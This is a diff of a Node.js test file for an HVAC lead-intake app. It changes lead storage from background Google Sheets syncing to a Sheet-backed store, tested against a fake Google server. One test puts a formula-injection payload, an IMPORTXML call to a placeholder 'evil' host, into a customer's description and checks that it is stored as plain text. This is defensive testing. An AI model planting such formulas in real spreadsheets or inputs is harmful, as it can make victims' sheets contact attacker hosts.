@@ -1,63 +1,57 @@
 import { test, before, after, beforeEach } from 'node:test';
 import assert from 'node:assert/strict';
-import { mkdtemp, rm } from 'node:fs/promises';
-import { tmpdir } from 'node:os';
-import { join } from 'node:path';
-import { COLUMNS, createSheetsSync, leadToRow } from './sheets.js';
+import { COLUMNS, leadToRow, openSheetStore } from './sheets.js';
+import { openLeadStore } from './store.js';
 import { createLead, recordContact, book } from './lead.js';
 import { startFakeGoogle } from './fakes.js';
 
 // A stand-in for Google (fakes.js): checks the signed sign-in and RAW writes.
-let fake;
-const google = {
-  get grid() { return fake.state.grid; }, set grid(v) { fake.state.grid = v; },
-  get down() { return fake.state.down; }, set down(v) { fake.state.down = v; },
-  get writes() { return fake.state.writes; },
-};
-const env = () => fake.env();
+let google;
+before(async () => { google = await startFakeGoogle(); });
+after(() => google.close());
+beforeEach(() => google.reset());
 
 const quietLog = () => {
   const lines = [];
   return { lines, error: (m) => lines.push(m) };
 };
-
 const request = {
   name: 'Dana Whitfield', phone: '(312) 555-0188', email: 'dana@example.com',
   service: 'ac_repair', description: 'AC blowing warm air since this morning.',
   urgency: 'soon', preferredDate: '2026-10-02', preferredWindow: 'morning',
 };
-const dataRows = () => google.grid.slice(1);
+const grid = () => google.state.grid;
+const dataRows = () => grid().slice(1);
 const col = (row, name) => row[COLUMNS.indexOf(name)];
+const sheetStore = (log = quietLog()) => openSheetStore(google.env(), { log });
 
-before(async () => { fake = await startFakeGoogle(); });
-after(() => fake.close());
-beforeEach(() => fake.reset());
+// ---- Choosing the store
 
-// ---- Settings
-
-test('without Google settings, sync is off and harmless', async () => {
-  const off = createSheetsSync({});
-  assert.equal(off.enabled, false);
-  assert.match(off.status, /sync off/);
-  off.sync(createLead(request));
-  await off.idle();
-
-  const partial = createSheetsSync({ GOOGLE_SHEET_ID: 'sheet-123' });
-  assert.equal(partial.enabled, false);
-  assert.match(partial.status, /must all be set/);
+test('store picker: the Sheet with all three Google settings, a local file with none', async () => {
+  assert.match((await openLeadStore(google.env(), { file: 'unused' })).status, /Google Sheet, tab "Leads"/);
+  assert.match((await openLeadStore({}, { file: '/tmp/x.jsonl' })).status, /x\.jsonl$/);
 });
 
-// ---- The four required behaviours
+test('store picker: some Google settings, or Vercel with none, refuses rather than guessing', async (t) => {
+  t.mock.method(console, 'error', () => {});
+  for (const env of [{ GOOGLE_SHEET_ID: 'sheet-123' }, { VERCEL: '1' }]) {
+    const store = await openLeadStore(env, { file: '/tmp/never.jsonl' });
+    assert.match(store.status, /NOT set up: missing/);
+    await assert.rejects(store.save(createLead(request)), (err) => err.status === 503 && !/GOOGLE/.test(err.message));
+  }
+});
+
+// ---- The four behaviours
 
 test('a new lead creates one row, under the header, with every column', async () => {
-  const sheets = createSheetsSync(env(), { log: quietLog() });
+  const store = sheetStore();
   const lead = createLead({ ...request, description: '=IMPORTXML("http://evil","//a") Also I smell gas.' });
-  await sheets.sync(lead);
+  await store.save(lead);
 
-  assert.deepEqual(google.grid[0], COLUMNS);
+  assert.deepEqual(grid()[0], COLUMNS);
   assert.equal(dataRows().length, 1);
   const row = dataRows()[0];
-  assert.equal(row.length, 18);
+  assert.equal(row.length, 19);
   assert.equal(col(row, 'Lead ID'), lead.reference);
   assert.equal(col(row, 'Customer Name'), 'Dana Whitfield');
   assert.equal(col(row, 'Service'), 'Air conditioning repair');
@@ -67,142 +61,103 @@ test('a new lead creates one row, under the header, with every column', async ()
   assert.equal(col(row, 'Follow-up Needed'), 'Yes');
   assert.match(col(row, 'Received At'), /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/);
   assert.equal(col(row, 'Preferred Time'), 'Morning (8am to 12pm)');
+  assert.deepEqual(JSON.parse(col(row, 'Record')), lead, 'the full lead is kept for the app');
   // Customer text is stored as text, never as a formula.
   assert.ok(col(row, 'Problem').startsWith('=IMPORTXML'));
-  assert.ok(google.writes.every((w) => w === 'RAW'));
-  sheets.stop();
+  assert.ok(google.state.writes.every((w) => w === 'RAW'));
 });
 
-test('a status change updates the same row', async () => {
-  const sheets = createSheetsSync(env(), { log: quietLog() });
+test('a status change updates the same row, and reads back exactly', async () => {
+  const store = sheetStore();
   let lead = createLead(request);
-  await sheets.sync(lead);
-
+  await store.save(lead);
   lead = recordContact(lead, { outcome: 'reached', by: 'Maria', note: 'Wants Friday' });
-  await sheets.sync(lead);
+  await store.save(lead);
   lead = book(lead, { date: '2026-10-02', window: 'morning' });
-  await sheets.sync(lead);
+  await store.save(lead);
 
   assert.equal(dataRows().length, 1);
   const row = dataRows()[0];
-  assert.equal(col(row, 'Lead ID'), lead.reference);
   assert.equal(col(row, 'Lead Status'), 'Qualified');
   assert.equal(col(row, 'Booking Status'), 'Booked');
   assert.equal(col(row, 'Follow-up Needed'), 'No');
   assert.equal(col(row, 'Callback Deadline'), '');
   assert.match(col(row, 'Last Contact'), /phone · reached · Maria · Wants Friday$/);
-  sheets.stop();
+
+  assert.deepEqual(await store.findByReference(lead.reference), lead);
+  assert.deepEqual(await store.get(lead.id), lead);
+  assert.equal(await store.findByReference('HV-NOSUCH'), null);
 });
 
 test('no duplicate rows: rapid changes, repeats, and rows the owner has moved', async () => {
-  const sheets = createSheetsSync(env(), { log: quietLog() });
+  const store = sheetStore();
   const a0 = createLead(request);
   const a1 = recordContact(a0, { outcome: 'reached' });
   const a2 = book(a1, { date: '2026-10-02', window: 'morning' });
   // Fired together, before any has finished: the create and its updates race.
-  sheets.sync(a0); sheets.sync(a1); sheets.sync(a2); sheets.sync(a2);
-  await sheets.idle();
+  await Promise.all([store.save(a0), store.save(a1), store.save(a2), store.save(a2)]);
   assert.equal(dataRows().length, 1);
   assert.equal(col(dataRows()[0], 'Booking Status'), 'Booked', 'the newest version wins');
 
   // A second lead, then the owner sorts the sheet so the rows swap places.
   const b0 = createLead({ ...request, name: 'Kim Lee' });
-  await sheets.sync(b0);
-  google.grid = [google.grid[0], google.grid[2], google.grid[1]];
-  await sheets.sync(recordContact(b0, { outcome: 'no_answer' }));
-  await sheets.sync(a2);
+  await store.save(b0);
+  google.state.grid = [grid()[0], grid()[2], grid()[1]];
+  await store.save(recordContact(b0, { outcome: 'no_answer' }));
+  await store.save(a2);
 
   assert.equal(dataRows().length, 2);
-  assert.deepEqual(dataRows().map((r) => col(r, 'Lead ID')).sort(), [a0.reference, b0.reference].sort());
-  const kim = dataRows().find((r) => col(r, 'Lead ID') === b0.reference);
-  assert.equal(col(kim, 'Customer Name'), 'Kim Lee');
-  assert.match(col(kim, 'Last Contact'), /no answer/);
-  sheets.stop();
+  const all = await store.all();
+  assert.deepEqual(all.map((l) => l.reference).sort(), [a0.reference, b0.reference].sort());
+  assert.equal(all.find((l) => l.id === b0.id).lastContact.outcome, 'no_answer');
 });
 
-test('Google down: nothing thrown, failure logged, row written once Google is back', async () => {
+test('Google down: the save fails clearly (503), the reason is logged, nothing half-written', async () => {
   const log = quietLog();
-  let latest = createLead(request);
-  const sheets = createSheetsSync(env(), { log, getLead: () => latest });
+  const store = sheetStore(log);
+  google.state.down = true;
+  await assert.rejects(store.save(createLead(request)),
+    (err) => err.status === 503 && err.message === 'Lead storage is unavailable. Please try again.');
+  await assert.rejects(store.all(), (err) => err.status === 503);
+  assert.match(log.lines[0], /^\[sheet\] .*503/);
+  assert.equal(grid().length, 0);
 
-  google.down = true;
-  await sheets.sync(latest); // must not throw
-  latest = recordContact(latest, { outcome: 'reached' }); // changed while Google was down
-  await sheets.sync(latest);
-  assert.equal(google.grid.length, 0);
-  assert.equal(sheets.failedCount(), 1);
-  assert.match(log.lines[0], new RegExp(`^\\[sheets\\] ${latest.reference} not synced, will retry: .*503`));
-
-  google.down = false;
-  await sheets.retryFailed();
-  assert.equal(sheets.failedCount(), 0);
+  // Back up: the next save works as normal.
+  google.state.down = false;
+  await store.save(createLead(request));
   assert.equal(dataRows().length, 1);
-  assert.equal(col(dataRows()[0], 'Lead Status'), 'Contacted', 'the retry sends the latest version');
-  sheets.stop();
+});
+
+// ---- Safety around hand edits
+
+test('rows typed in by hand, or with a damaged Record, are skipped, not trusted', async () => {
+  const log = quietLog();
+  const store = sheetStore(log);
+  const real = createLead(request);
+  await store.save(real);
+  const forged = { ...createLead(request), reference: 'HV-OTHER1' };
+  grid().push(['HV-HANDMADE', '2026-10-01 09:00', 'Typed by owner']);           // no Record
+  grid().push(['HV-BROKEN1', ...Array(17).fill(''), '{not json']);              // damaged Record
+  grid().push(['HV-MISMATCH', ...Array(17).fill(''), JSON.stringify(forged)]);  // Record for another lead
+  assert.deepEqual((await store.all()).map((l) => l.reference), [real.reference]);
+  assert.equal(log.lines.length, 2);
 });
 
 test('refuses to write over a tab that holds something else', async () => {
-  google.grid = [['Invoice #', 'Amount'], ['1001', '$250']];
+  google.state.grid = [['Invoice #', 'Amount'], ['1001', '$250']];
   const log = quietLog();
-  const sheets = createSheetsSync(env(), { log });
-  await sheets.sync(createLead(request));
-  assert.deepEqual(google.grid, [['Invoice #', 'Amount'], ['1001', '$250']]);
+  await assert.rejects(sheetStore(log).save(createLead(request)), (err) => err.status === 503);
+  assert.deepEqual(grid(), [['Invoice #', 'Amount'], ['1001', '$250']]);
   assert.match(log.lines[0], /Use an empty tab/);
-  sheets.stop();
+});
+
+test('an existing 18-column header gets the Record column added', async () => {
+  google.state.grid = [COLUMNS.slice(0, 18)];
+  await sheetStore().save(createLead(request));
+  assert.deepEqual(grid()[0], COLUMNS);
+  assert.equal(dataRows().length, 1);
 });
 
 test('leadToRow matches the column list', () => {
   assert.equal(leadToRow(createLead(request)).length, COLUMNS.length);
-});
-
-// ---- Through the real server
-
-test('server: submissions and office changes reach the sheet; a Google outage never blocks a customer', async (t) => {
-  const tmp = await mkdtemp(join(tmpdir(), 'hvac-sheets-'));
-  Object.assign(process.env, env(), { LEADS_FILE: join(tmp, 'leads.jsonl'), OFFICE_TOKEN: 'office-pw', WEBHOOK_URL: '' });
-  const { server, sheets } = await import('./server.js');
-  server.listen(0);
-  const base = `http://127.0.0.1:${server.address().port}`;
-  const errors = [];
-  t.mock.method(console, 'error', (m) => errors.push(String(m)));
-  t.mock.method(console, 'log', () => {});
-  t.after(async () => { server.close(); sheets.stop(); await rm(tmp, { recursive: true, force: true }); });
-
-  const submit = (body) => fetch(`${base}/api/requests`, {
-    method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...request, ...body }),
-  });
-  const office = (path, body) => fetch(`${base}/api/leads${path}`, {
-    method: body ? 'POST' : 'GET',
-    headers: { Authorization: 'Bearer office-pw', 'Content-Type': 'application/json' },
-    body: body && JSON.stringify(body),
-  }).then((r) => r.json());
-
-  // Customer submits -> one row.
-  const { reference } = await (await submit({})).json();
-  await sheets.idle();
-  assert.equal(dataRows().length, 1);
-  assert.equal(col(dataRows()[0], 'Lead ID'), reference);
-
-  // Owner changes status -> same row updated.
-  await office(`/${reference}/contact`, { outcome: 'reached' });
-  await office(`/${reference}/qualify`, {});
-  await sheets.idle();
-  assert.equal(dataRows().length, 1);
-  assert.equal(col(dataRows()[0], 'Lead Status'), 'Qualified');
-
-  // Google goes down: the customer still gets their confirmation, the lead is kept.
-  google.down = true;
-  const res = await submit({ name: 'Ray Ortiz', description: 'Furnace makes a loud bang when it starts.' });
-  assert.equal(res.status, 201);
-  const { reference: ray } = await res.json();
-  await sheets.idle();
-  assert.equal(dataRows().length, 1, 'nothing reached the sheet');
-  assert.equal((await office(`/${ray}`)).lead.customer.name, 'Ray Ortiz', 'the lead is saved locally');
-  assert.ok(errors.some((e) => e.includes(`[sheets] ${ray} not synced`)), 'the failure is logged');
-
-  // Google comes back: the missed lead is written, once.
-  google.down = false;
-  await sheets.retryFailed();
-  assert.equal(dataRows().length, 2);
-  assert.deepEqual(dataRows().map((r) => col(r, 'Lead ID')), [reference, ray]);
 });
